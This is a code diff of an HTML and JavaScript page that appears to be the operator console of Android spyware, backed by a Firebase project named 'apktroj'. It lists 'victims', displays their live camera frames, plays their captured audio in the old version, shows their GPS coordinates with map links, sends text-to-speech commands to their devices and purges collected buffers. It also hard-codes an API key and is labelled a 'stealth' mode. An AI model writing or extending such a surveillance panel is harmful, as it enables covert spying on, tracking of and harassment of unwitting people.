@@ -3,46 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R MONITORING REAL-TIME</title>
+    <title>C.R Monitoring V1.5 - Pro Streamer</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; }
-        .neon-box { border: 1px solid #0f0; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
+        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
+        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
+        .tab-btn.active { border-color: #ff0000; color: #ff0000; }
+        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        #stream-img { width: 100%; height: 100%; object-fit: contain; background: #000; }
     </style>
 </head>
-<body class="p-6">
+<body class="p-4">
     <div class="max-w-6xl mx-auto">
-        <header class="border-b border-green-900 pb-4 mb-6 flex justify-between">
-            <h1 class="text-xl font-bold text-red-600">C.R COMMAND CENTER V3.0 [REAL-TIME]</h1>
-            <div id="status" class="text-xs text-green-500 italic">MENGHUBUNGKAN...</div>
+        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
+            <div>
+                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.5</h1>
+                <p class="text-xs text-gray-500 text-green-400">STEALTH & OPTIMIZED MODE</p>
+            </div>
+            <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
         </header>
 
         <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
-            <!-- Audio/Visual Feed -->
-            <div class="lg:col-span-3 space-y-4">
-                <div class="neon-box bg-black p-4 aspect-video relative flex items-center justify-center">
-                    <img id="stream-view" class="w-full h-full object-contain hidden border border-green-900">
-                    <div id="no-signal" class="text-green-900 font-bold italic uppercase">Menunggu Sinyal Target...</div>
-                    <div class="absolute top-4 left-4 flex items-center space-x-2">
-                        <div class="w-2 h-2 bg-red-600 rounded-full animate-ping"></div>
-                        <span class="text-[10px] font-bold text-red-600">LIVE FEED</span>
-                    </div>
+            <!-- Target Status -->
+            <div class="lg:col-span-1 border-r border-green-900 pr-4">
+                <h2 class="text-lg font-bold mb-4">ACTIVE TARGETS</h2>
+                <div id="victim-list" class="space-y-2">
+                    <div class="text-xs text-gray-600 italic">Listening for incoming connections...</div>
                 </div>
-                <!-- Output audio untuk mendengar target secara real-time -->
-                <audio id="audio-output" autoplay></audio>
             </div>
 
-            <!-- Dashboard Kontrol -->
-            <div class="space-y-4">
-                <div class="neon-box p-4 bg-gray-950">
-                    <h2 class="text-xs font-bold mb-4 border-b border-green-900 text-blue-400">PERINTAH SUARA (TTS)</h2>
-                    <textarea id="tts-input" class="w-full h-24 bg-black border border-green-900 p-2 text-green-400 text-xs outline-none" placeholder="Ketik pesan suara untuk target..."></textarea>
-                    <button id="send-btn" class="w-full mt-2 bg-blue-900 hover:bg-blue-700 text-white py-2 text-xs font-bold transition-all uppercase tracking-widest">Kirim Suara</button>
+            <!-- Dashboard -->
+            <div class="lg:col-span-3">
+                <div class="flex space-x-4 mb-4 border-b border-gray-800">
+                    <div class="tab-btn active" id="tab-live">LIVE FEED & INTEL</div>
                 </div>
 
-                <div class="neon-box p-4 bg-gray-950">
-                    <h2 class="text-xs font-bold mb-2 text-yellow-500 uppercase tracking-widest">Target Aktif</h2>
-                    <div id="victim-list" class="text-[9px] space-y-1 overflow-y-auto max-h-40"></div>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <!-- Video Section -->
+                    <div class="glitch-border p-4 bg-black relative">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-xs text-red-500 font-bold uppercase">Cam Stream</span>
+                            <span class="live-indicator" id="live-status">● IDLE</span>
+                        </div>
+                        <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden">
+                            <img id="stream-img" src="" class="hidden">
+                            <span id="placeholder" class="text-gray-700">Waiting for stream...</span>
+                        </div>
+                        <div class="mt-4 p-2 bg-gray-900 border border-green-900 rounded">
+                            <p class="text-[10px] text-green-500 uppercase font-bold mb-1">Geoloc Intel:</p>
+                            <p class="text-xs text-white" id="lat-long">Coords: 0.0, 0.0</p>
+                            <a id="map-link" href="#" target="_blank" class="text-[10px] text-blue-400 underline hidden mt-1">OPEN IN GOOGLE MAPS</a>
+                        </div>
+                    </div>
+
+                    <!-- Control Section -->
+                    <div class="glitch-border p-4 bg-black flex flex-col">
+                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Voice Intercom</h3>
+                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Ketik pesan suara ke target..."></textarea>
+                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 transition-all uppercase text-xs">Broadcast Voice</button>
+                        
+                        <div class="mt-4 p-2 bg-red-900 bg-opacity-20 border border-red-900 rounded">
+                            <p class="text-[10px] text-red-500 font-bold">System Command:</p>
+                            <button id="purge-btn" class="text-[10px] text-white underline mt-1">Nuke All Stream Buffers</button>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -50,103 +76,80 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+        import { getFirestore, collection, onSnapshot, doc, setDoc, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Mengambil konfigurasi dari lingkungan runtime untuk memperbaiki error invalid-api-key
-        const firebaseConfig = typeof __firebase_config !== 'undefined' 
-            ? JSON.parse(__firebase_config) 
-            : {
-                apiKey: "", // Kosongkan, sistem akan mengisinya otomatis
-                authDomain: "apktroj.firebaseapp.com",
-                projectId: "apktroj",
-                storageBucket: "apktroj.firebasestorage.app",
-                messagingSenderId: "943833619122",
-                appId: "1:943833619122:web:d757ced4d56267abf247ab"
-            };
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+        };
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'apktroj_v1';
-        let lastAudioTimestamp = 0;
-        let user = null;
+        const appId = "apktroj_v1";
 
-        // Login otomatis sebagai operator
-        const initAuth = async () => {
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (err) {
-                console.error("Auth failed:", err);
-                document.getElementById('status').innerText = "ERROR KONEKSI";
-            }
-        };
-
-        onAuthStateChanged(auth, (u) => {
-            if (u) {
-                user = u;
-                document.getElementById('status').innerText = "OPERATOR AKTIF: " + user.uid.substring(0, 10);
-                startMonitoring();
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) await signInAnonymously(auth);
+            else {
+                document.getElementById('auth-info').innerText = "CMD ACTIVE: " + user.uid;
+                initMonitor();
             }
         });
 
-        function startMonitoring() {
-            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
-            
-            // Mendengarkan data masuk secara real-time
-            onSnapshot(colRef, (snap) => {
+        function initMonitor() {
+            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
+            onSnapshot(streamCol, (snap) => {
                 const list = document.getElementById('victim-list');
-                list.innerHTML = "";
+                if(!snap.empty) list.innerHTML = '';
                 
                 snap.forEach(docSnap => {
                     const data = docSnap.data();
-                    const targetId = docSnap.id;
-                    list.innerHTML += `<div class="p-1 border border-green-900 bg-green-950 uppercase tracking-tighter">UID: ${targetId.substring(0,12)} | ONLINE</div>`;
+                    const img = document.getElementById('stream-img');
+                    const ph = document.getElementById('placeholder');
                     
-                    // Update tampilan visual dari target
+                    // Update Victim List
+                    const v = document.createElement('div');
+                    v.className = "p-2 border border-green-900 text-[10px] bg-green-900 bg-opacity-10";
+                    v.innerText = `TARGET_${data.uid?.substring(0,6)} (LIVE)`;
+                    list.appendChild(v);
+
                     if (data.frame) {
-                        const img = document.getElementById('stream-view');
                         img.src = data.frame;
                         img.classList.remove('hidden');
-                        document.getElementById('no-signal').classList.add('hidden');
+                        ph.classList.add('hidden');
+                        document.getElementById('live-status').innerText = "● STREAMING";
                     }
 
-                    // Putar audio masuk dari target secara otomatis
-                    if (data.audio && data.timestamp > lastAudioTimestamp) {
-                        const audioOut = document.getElementById('audio-output');
-                        audioOut.src = data.audio;
-                        audioOut.play().catch(() => {
-                            // Browser memerlukan klik pengguna sebelum autoplay diizinkan
-                        });
-                        lastAudioTimestamp = data.timestamp;
+                    if (data.location) {
+                        document.getElementById('lat-long').innerText = `Coords: ${data.location.lat}, ${data.location.lng}`;
+                        const mLink = document.getElementById('map-link');
+                        mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
+                        mLink.classList.remove('hidden');
                     }
                 });
-            }, (err) => console.error("Snapshot error:", err));
+            });
         }
 
-        // Fungsi kirim perintah suara (Text-to-Speech)
-        document.getElementById('send-btn').onclick = async () => {
-            if (!user) return;
-            const txt = document.getElementById('tts-input').value;
+        document.getElementById('send-voice').onclick = async () => {
+            const txt = document.getElementById('voice-msg').value;
             if(!txt) return;
-            
-            try {
-                await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
-                    text: txt,
-                    timestamp: Date.now()
-                });
-                document.getElementById('tts-input').value = "";
-            } catch (err) {
-                console.error("Gagal mengirim perintah:", err);
-            }
+            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
+                text: txt,
+                timestamp: Date.now()
+            });
+            document.getElementById('voice-msg').value = "";
         };
 
-        // Mulai proses autentikasi
-        initAuth();
+        document.getElementById('purge-btn').onclick = async () => {
+            const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer'));
+            snap.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', d.id)));
+            alert("Buffers cleared.");
+        };
     </script>
 </body>
 </html>
